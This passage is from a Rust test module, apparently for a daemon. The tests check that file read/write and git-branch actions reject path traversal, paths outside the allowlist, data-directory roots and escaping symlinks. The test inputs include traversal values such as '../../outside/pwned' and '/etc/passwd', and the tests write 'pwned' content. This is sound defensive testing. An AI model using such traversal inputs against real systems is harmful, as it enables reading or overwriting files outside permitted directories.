                json!({ "projectRoot": s(&proj), "skill": "skill-mail", "file": "nope.json" }),
                json!({ "projectRoot": s(&d.allowed.join("gone")), "skill": "s", "file": "f" }),
                json!({ "projectRoot": null, "skill": "s", "file": "f" }),
                json!({ "projectRoot": "", "skill": "s", "file": "f" }),
            ] {
                assert_eq!(ok(r, "atelier_file_read", args).await, Value::Null);
            }
            // No root: the desktop's exact write error, not double-prefixed.
            let e = err(
                r,
                "atelier_file_write",
                json!({ "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            assert_eq!(e, "atelier_file_write: no project root configured");
            // A root that does not exist is not created.
            let gone = d.allowed.join("gone");
            let e = err(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&gone), "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            assert!(
                e.starts_with("atelier_file_write: project root is not a directory"),
                "{e}"
            );
            assert!(!gone.exists());
            // A root that is a file: nothing to read, nowhere to write.
            let file_root = d.allowed.join("plain.txt");
            std::fs::write(&file_root, "x").unwrap();
            assert_eq!(
                ok(
                    r,
                    "atelier_file_read",
                    json!({ "projectRoot": s(&file_root), "skill": "s", "file": "f" }),
                )
                .await,
                Value::Null
            );
            let e = err(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&file_root), "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            assert!(
                e.starts_with("atelier_file_write: project root is not a directory"),
                "{e}"
            );
            let e = err(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&proj), "skill": "s", "file": "f" }),
            )
            .await;
            assert!(e.contains("`content` is required"), "{e}");
        }

        #[tokio::test]
        async fn atelier_segments_keep_the_desktop_traversal_checks() {
            let d = daemon();
            let r = &d.router;
            let proj = d.allowed.join("proj");
            std::fs::create_dir_all(&proj).unwrap();
            for (skill, file) in [
                ("..", "manifest.json"),
                ("a/b", "manifest.json"),
                ("skill-mail", "../../outside/pwned"),
                ("skill-mail", "/etc/passwd"),
                ("skill-mail", "a\\b"),
                ("", "f"),
            ] {
                let e = err(
                    r,
                    "atelier_file_write",
                    json!({ "projectRoot": s(&proj), "skill": skill, "file": file, "content": "pwned" }),
                )
                .await;
                assert_eq!(
                    e,
                    format!(
                        "atelier_file_write: unsafe path segment (skill={skill:?}, file={file:?})"
                    )
                );
                assert_eq!(
                    ok(
                        r,
                        "atelier_file_read",
                        json!({ "projectRoot": s(&proj), "skill": skill, "file": file }),
                    )
                    .await,
                    Value::Null
                );
            }
            assert!(tree(&proj).is_empty());
            assert!(tree(&d.outside).is_empty());
        }

        #[tokio::test]
        async fn atelier_roots_outside_the_allowlist_are_refused() {
            let d = daemon();
            let r = &d.router;
            std::fs::create_dir_all(d.outside.join(".atelier/s")).unwrap();
            std::fs::write(d.outside.join(".atelier/s/f"), "secret").unwrap();
            let mut roots = vec![
                s(&d.outside),
                format!("{}/../outside", s(&d.allowed)),
                "relative/root".to_string(),
            ];
            #[cfg(unix)]
            {
                symlink(&d.outside, &d.allowed.join("link"));
                roots.push(s(&d.allowed.join("link")));
            }
            for root in roots {
                let e = err(
                    r,
                    "atelier_file_read",
                    json!({ "projectRoot": root, "skill": "s", "file": "f" }),
                )
                .await;
                assert!(e.starts_with("atelier_file_read: "), "{root}: {e}");
                let e = err(
                    r,
                    "atelier_file_write",
                    json!({ "projectRoot": root, "skill": "s", "file": "g", "content": "pwned" }),
                )
                .await;
                assert!(e.starts_with("atelier_file_write: "), "{root}: {e}");
                assert!(
                    e.contains("outside allowlist")
                        || e.contains("`..`")
                        || e.contains("not absolute"),
                    "{root}: {e}"
                );
            }
            assert_eq!(tree(&d.outside), [".atelier", ".atelier/s", ".atelier/s/f"]);
        }

        #[tokio::test]
        async fn atelier_roots_inside_the_data_dir_are_refused() {
            let (_tmp, root, data, r) = over_data_dir();
            // A sibling inside the same allowlist root is served…
            let proj = root.join("proj");
            std::fs::create_dir_all(&proj).unwrap();
            ok(
                &r,
                "atelier_file_write",
                json!({ "projectRoot": s(&proj), "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            // …the data dir, and anything under it, is not.
            std::fs::create_dir_all(data.join("inner")).unwrap();
            for root in [s(&data), s(&data.join("inner"))] {
                let e = err(
                    &r,
                    "atelier_file_write",
                    json!({ "projectRoot": root, "skill": "s", "file": "f", "content": "pwned" }),
                )
                .await;
                assert!(e.contains(INSIDE_DATA_DIR), "{root}: {e}");
                let e = err(
                    &r,
                    "atelier_file_read",
                    json!({ "projectRoot": root, "skill": "s", "file": "f" }),
                )
                .await;
                assert!(e.contains(INSIDE_DATA_DIR), "{root}: {e}");
            }
            assert_eq!(tree(&data), ["inner"]);
            // `.atelier` symlinked INTO the data dir from a served root.
            #[cfg(unix)]
            {
                let p2 = root.join("p2");
                std::fs::create_dir_all(&p2).unwrap();
                symlink(&data, &p2.join(".atelier"));
                let e = err(
                    &r,
                    "atelier_file_write",
                    json!({ "projectRoot": s(&p2), "skill": "s", "file": "f", "content": "pwned" }),
                )
                .await;
                assert!(e.contains("refusing to follow a symlink"), "{e}");
                assert_eq!(tree(&data), ["inner"]);
            }
        }

        /// `.atelier`, `.atelier/<skill>` or the file itself linked out of
        /// the root — live or dangling — is refused, and nothing is created
        /// where the link points.
        #[tokio::test]
        #[cfg(unix)]
        async fn atelier_never_follows_a_symlink_out_of_the_root() {
            let d = daemon();
            let r = &d.router;

            // `.atelier` → outside/.
            let a = d.allowed.join("a");
            std::fs::create_dir_all(&a).unwrap();
            symlink(&d.outside, &a.join(".atelier"));
            // `.atelier/s` → a sibling INSIDE the allowlist (still out of the root).
            let b = d.allowed.join("b");
            let elsewhere = d.allowed.join("elsewhere");
            std::fs::create_dir_all(b.join(".atelier")).unwrap();
            std::fs::create_dir_all(&elsewhere).unwrap();
            symlink(&elsewhere, &b.join(".atelier/s"));
            // The file itself: a dangling link to a file that does not exist yet.
            let c = d.allowed.join("c");
            std::fs::create_dir_all(c.join(".atelier/s")).unwrap();
            symlink(&d.outside.join("planted"), &c.join(".atelier/s/f"));
            // `.atelier` dangling.
            let e_root = d.allowed.join("e");
            std::fs::create_dir_all(&e_root).unwrap();
            symlink(&d.outside.join("not-yet"), &e_root.join(".atelier"));

            for root in [&a, &b, &c, &e_root] {
                let e = err(
                    r,
                    "atelier_file_write",
                    json!({ "projectRoot": s(root), "skill": "s", "file": "f", "content": "pwned" }),
                )
                .await;
                assert!(
                    e.starts_with(
                        "atelier_file_write: refusing to follow a symlink out of the project root"
                    ),
                    "{}: {e}",
                    root.display()
                );
                let e = err(
                    r,
                    "atelier_file_read",
                    json!({ "projectRoot": s(root), "skill": "s", "file": "f" }),
                )
                .await;
                assert!(
                    e.contains("refusing to follow a symlink"),
                    "{}: {e}",
                    root.display()
                );
            }
            assert!(tree(&d.outside).is_empty(), "{:?}", tree(&d.outside));
            assert!(tree(&elsewhere).is_empty());
        }

        // ── action_git_branch ───────────────────────────────────────────────

        fn head(git_dir: &Path, contents: &str) {
            std::fs::create_dir_all(git_dir).unwrap();
            std::fs::write(git_dir.join("HEAD"), contents).unwrap();
        }

        #[tokio::test]
        async fn git_branch_reads_head_inside_the_allowlist() {
            let d = daemon();
            let r = &d.router;
            let repo = d.allowed.join("repo");
            head(&repo.join(".git"), "ref: refs/heads/feat/x\n");
            let got = ok(r, "action_git_branch", json!({ "root": s(&repo) })).await;
            assert_eq!(got, "feat/x");
            // Parity with the desktop's core.
            assert_eq!(got, json!(git::git_branch_at(&repo)));

            // Detached HEAD → null.
            head(
                &repo.join(".git"),
                "0123456789abcdef0123456789abcdef01234567\n",
            );
            assert_eq!(
                ok(r, "action_git_branch", json!({ "root": s(&repo) })).await,
                Value::Null
            );

            // A worktree: `.git` is a `gitdir:` file (absolute), and a
            // submodule-style relative one.
            let main_git = d.allowed.join("main/.git");
            head(
                &main_git.join("worktrees/wt"),
                "ref: refs/heads/wt-branch\n",
            );
            let wt = d.allowed.join("wt");
            std::fs::create_dir_all(&wt).unwrap();
            std::fs::write(
                wt.join(".git"),
                format!("gitdir: {}\n", s(&main_git.join("worktrees/wt"))),
            )
            .unwrap();
            let got = ok(r, "action_git_branch", json!({ "root": s(&wt) })).await;
            assert_eq!(got, "wt-branch");
            assert_eq!(got, json!(git::git_branch_at(&wt)));
            head(
                &main_git.join("modules/sub"),
                "ref: refs/heads/sub-branch\n",
            );
            let sub = d.allowed.join("main/sub");
            std::fs::create_dir_all(&sub).unwrap();
            std::fs::write(sub.join(".git"), "gitdir: ../.git/modules/sub\n").unwrap();
            assert_eq!(
                ok(r, "action_git_branch", json!({ "root": s(&sub) })).await,
                "sub-branch"
            );

            // Not a work tree, missing, or relative: the desktop's null.
            for root in [
                s(&d.allowed),
                s(&d.allowed.join("missing")),
                "relative".to_string(),
                String::new(),
            ] {
                assert_eq!(
                    ok(r, "action_git_branch", json!({ "root": root })).await,
                    Value::Null,
                    "{root}"
                );
            }
            let e = err(r, "action_git_branch", json!({})).await;
            assert!(e.contains("`root` is required"), "{e}");
        }

        #[tokio::test]
        async fn git_branch_refuses_roots_and_gitdirs_the_guard_refuses() {
            let d = daemon();
            let r = &d.router;
            head(&d.outside.join(".git"), "ref: refs/heads/secret\n");
            let mut roots = vec![s(&d.outside), format!("{}/../outside", s(&d.allowed))];
            #[cfg(unix)]
            {
                symlink(&d.outside, &d.allowed.join("link"));
                roots.push(s(&d.allowed.join("link")));
            }
            for root in roots {
                let e = err(r, "action_git_branch", json!({ "root": root })).await;
                assert!(e.starts_with("action_git_branch: "), "{root}: {e}");
                assert!(
                    e.contains("outside allowlist") || e.contains("`..`"),
                    "{root}: {e}"
                );
            }
            // A root inside the allowlist whose `gitdir:` (or `.git` link)
            // points outside it: not read — no branch.
            let wt = d.allowed.join("wt");
            std::fs::create_dir_all(&wt).unwrap();
            std::fs::write(
                wt.join(".git"),
                format!("gitdir: {}\n", s(&d.outside.join(".git"))),
            )
            .unwrap();
            assert_eq!(
                ok(r, "action_git_branch", json!({ "root": s(&wt) })).await,
                Value::Null
            );
            // (The desktop reads it: the guard is the daemon's alone.)
            assert_eq!(git::git_branch_at(&wt).as_deref(), Some("secret"));
            #[cfg(unix)]
            {
                let linked = d.allowed.join("linked");
                std::fs::create_dir_all(&linked).unwrap();
                symlink(&d.outside.join(".git"), &linked.join(".git"));
                assert_eq!(
                    ok(r, "action_git_branch", json!({ "root": s(&linked) })).await,
                    Value::Null
                );
            }
        }

        #[tokio::test]
        async fn git_branch_refuses_the_data_dir() {
            let (_tmp, root, data, r) = over_data_dir();
            head(&data.join("repo/.git"), "ref: refs/heads/x\n");
            for p in [s(&data), s(&data.join("repo"))] {
                let e = err(&r, "action_git_branch", json!({ "root": p })).await;
                assert!(e.contains(INSIDE_DATA_DIR), "{p}: {e}");
            }
            // A served root whose gitdir points into the data dir reads nothing.
            let wt = root.join("wt");
            std::fs::create_dir_all(&wt).unwrap();
            std::fs::write(
                wt.join(".git"),
                format!("gitdir: {}\n", s(&data.join("repo/.git"))),
            )
            .unwrap();
            assert_eq!(
                ok(&r, "action_git_branch", json!({ "root": s(&wt) })).await,
                Value::Null
            );
        }
    }
}
